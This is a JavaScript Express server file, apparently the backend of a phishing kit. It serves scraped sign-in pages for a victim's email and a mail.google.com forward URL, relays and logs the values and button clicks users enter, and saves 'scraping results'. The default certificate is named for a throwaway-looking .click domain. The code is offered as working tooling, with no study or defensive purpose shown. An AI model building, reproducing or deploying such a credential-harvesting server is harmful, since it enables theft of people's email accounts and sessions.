// app.js — Express port of your Flask server
// ------------------------------------------

import fs from "fs";
import path from "path";
import http from "http";
import https from "https";
import express from "express";
import cors from "cors";
import dotenv from "dotenv";

// Load env (PORT, SSL, CERT, KEY)
dotenv.config();

import {
  // mirror your Python common.py exports:
  check_email_already_signin,   // (email, forwardUrl) => [boolean, htmlString]
  check_email_alreay_running,   // (email) => number
  get_user_id,                  // ({ user_ip, user_agent }) => number
} from "./common.js";

import {
  // mirror your Python scraping.py exports:
  scraping_ready,               // (userId, email, hl, { forward_url, user_agent, new_user_flg }) => html
  scrap_input_value_and_btn_next, // (userId, inputValue, btnType, btnText) => obj
  scrap_check_url,              // (userId) => obj
  save_scraping_result_and_set_done, // (userId) => void
} from "./scraping.js";

// ---------------------------
// Config
// ---------------------------
const app = express();
const PORT = Number(process.env.PORT || 8101);
const SSL = String(process.env.SSL || "false").toLowerCase() === "true";

app.use(cors());
app.use(express.json({ limit: "2mb" }));
app.use(express.urlencoded({ extended: true }));

// If you sit behind a reverse proxy and want accurate req.ip:
app.set("trust proxy", true);

// ---------------------------
// Helpers
// ---------------------------
const b64safe = (v, def = "") => {
  try {
    if (!v) return def;
    return Buffer.from(v, "base64").toString("utf-8");
  } catch {
    return def;
  }
};

const pick = (obj, key, def = "") =>
  obj && obj[key] !== undefined && obj[key] !== null ? obj[key] : def;

// ---------------------------
// Routes
// ---------------------------
app.get("/pyapi/test", (req, res) => {
  console.log("[API TESTING]");
  return res.status(200).json({
    msg: `API server is running on port : ${PORT}`,
    status: 200,
  });
});

// /information/session/sign  (GET or POST)
// Mirrors Flask logic: accept JSON body + query params
app.all("/information/session/sign", async (req, res) => {
  try {
    // NOTE: local-only check, same as Flask's 127.0.0.1
    // req.ip could be "::1" for IPv6 localhost; allow both.
    const ip = req.ip?.replace("::ffff:", "");
    if (ip !== "127.0.0.1" && ip !== "::1") {
      console.log(`******** [DANGER IP] : ${ip} ********`);
      return res.status(404).send("Page Not Found");
    }

    // Prefer JSON body, fallback to query
    const body = req.body || {};
    const q = req.query || {};

    const user_agent = pick(body, "user_agent", req.get("User-Agent") || "");
    const client_ip = pick(body, "client_ip", ip || "");

    let email = b64safe(q.acc, "");
    let hl = String(q.hl || "en");
    let forward_url = b64safe(q.forward, "https://mail.google.com");

    // Check if already signed in
    const [chkflg, signin_html] = await check_email_already_signin(
      email,
      forward_url
    );
    if (chkflg === true) {
      console.log("[ALREADY SIGNED IN] :", email);
      // Flask returns raw HTML here
      return res.status(200).send(signin_html || "");
    }

    // Check if already running
    const tmpid = await check_email_alreay_running(email);

    if (Number(tmpid) < 0) {
      // New user id
      const user_id = await get_user_id({
        user_ip: client_ip,
        user_agent,
      });
      console.log("[NEW USER ID] :", user_id, email, hl, forward_url);

      const html_txt = await scraping_ready(
        user_id,
        email,
        hl,
        { forward_url, user_agent, new_user_flg: true }
      );
      return res.status(200).send(html_txt || "");
    } else {
      // Reuse existing user id
      console.log("[USER ID]", tmpid, email);
      const html_txt = await scraping_ready(
        tmpid,
        email,
        hl,
        { forward_url, user_agent, new_user_flg: false }
      );
      return res.status(200).send(html_txt || "");
    }
  } catch (err) {
    console.error("[/information/session/sign] error:", err);
    return res.status(500).json({ status: 0, error: "internal_error" });
  }
});

// /pyapi/btn-click  (GET or POST)
app.all("/pyapi/btn-click", async (req, res) => {
  try {
    const payload = req.body || {};
    const user_id = payload.uid;
    const input_value = payload.value;
    const btn_type = payload.btn_type;
    const btn_text = payload.btn_text;

    console.log("[BTN CLICK] :", user_id, input_value, btn_type, btn_text);

    const out = await scrap_input_value_and_btn_next(
      user_id,
      input_value,
      btn_type,
      btn_text
    );
    return res.json(out || {});
  } catch (err) {
    console.error("[/pyapi/btn-click] error:", err);
    return res.status(500).json({ status: 0, error: "internal_error" });
  }
});

// /pyapi/url-check  (GET or POST)
app.all("/pyapi/url-check", async (req, res) => {
  try {
    const payload = req.body || {};
    const user_id = payload.uid;
    const out = await scrap_check_url(user_id);
    return res.json(out || {});
  } catch (err) {
    console.error("[/pyapi/url-check] error:", err);
    return res.status(500).json({ status: 0, error: "internal_error" });
  }
});

// /pyapi/done-user  (GET or POST)
app.all("/pyapi/done-user", async (req, res) => {
  try {
    const payload = req.body || {};
    const user_id = payload.uid;
    await save_scraping_result_and_set_done(user_id);
    console.log("[DONE USER]", user_id);
    return res.json({ status: 1 });
  } catch (err) {
    console.error("[/pyapi/done-user] error:", err);
    return res.status(500).json({ status: 0, error: "internal_error" });
  }
});

// robots.txt (serve from ./public like Flask's send_from_directory)
app.use(express.static(path.join(process.cwd(), "public")));
app.get("/robots.txt", (req, res) => {
  const p = path.join(process.cwd(), "public", "robots.txt");
  if (fs.existsSync(p)) return res.sendFile(p);
  return res.status(404).send("Not found");
});

// ---------------------------
// Server bootstrap (HTTP/HTTPS)
// ---------------------------
if (SSL) {
  const certPath = process.env.CERT || "atomh3des1.click.crt";
  const keyPath = process.env.KEY || "atomh3des1.click.key";
  const options = {
    cert: fs.readFileSync(certPath),
    key: fs.readFileSync(keyPath),
  };
  https.createServer(options, app).listen(PORT, "0.0.0.0", () => {
    console.log(`HTTPS server listening on https://0.0.0.0:${PORT}`);
  });
} else {
  http.createServer(app).listen(PORT, "0.0.0.0", () => {
    console.log(`HTTP server listening on http://0.0.0.0:${PORT}`);
  });
}
